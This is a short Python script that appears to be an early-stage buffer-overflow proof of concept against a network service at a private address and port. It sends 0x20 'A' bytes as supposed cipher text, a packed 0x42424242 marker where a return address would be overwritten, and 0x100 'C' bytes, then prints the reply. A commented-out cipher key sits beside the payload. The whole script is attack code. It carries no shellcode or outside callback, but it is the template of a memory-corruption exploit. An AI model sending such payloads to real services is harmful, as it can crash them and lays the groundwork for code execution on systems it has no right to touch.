#!/usr/bin/python3
import socket
from struct import pack

HOST= "192.168.1.167"
PORT = 59869

#cipher_key = bytearray.fromhex('32C7C89DCD16F2AD83E5FF3D03267EDAD9F4F9779F56FA02B1F32F479CC6EEBD')
cipher_text = b"A" * 0x20

BUFF  = cipher_text
BUFF += pack("<L",0x42424242)
BUFF += b"C"* 0x100


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((HOST, PORT))
    s.send(BUFF)
    test = s.recv(2048)
    print(test)
except socket.error as err:
    print(err)